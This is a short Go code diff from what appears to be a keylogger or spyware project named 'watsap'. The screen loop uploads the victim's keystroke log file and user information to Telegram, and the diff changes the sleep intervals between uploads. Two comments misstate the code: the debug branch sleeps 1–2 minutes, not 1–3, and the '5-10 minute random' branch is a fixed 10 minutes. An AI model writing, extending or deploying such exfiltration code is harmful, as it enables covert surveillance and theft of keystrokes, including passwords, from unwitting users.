@@ -2,6 +2,7 @@ package screen
 
 import (
 	"log"
+	"math/rand"
 	"time"
 	"watsap/utils/config"
 	"watsap/utils/messages"
@@ -17,9 +18,14 @@ func LoopScreen() {
 		InitScreen()
 		telegram.TgSendFile(config.KeylogFile, messages.GetUserInfoMsg())
 		if config.DebugMode {
-			time.Sleep(1 * time.Minute)
+			// Random sleep between 1-3 minutes
+			sleepDuration := time.Duration(rand.Intn(2)+1) * time.Minute
+			time.Sleep(sleepDuration)
 		} else {
-			time.Sleep(5 * time.Minute)
+			// sleep random between 5-10 minutes
+			sleepDuration := time.Duration(10) * time.Minute
+			time.Sleep(sleepDuration)
+			//time.Sleep(1 * time.Second)
 		}
 	}
 
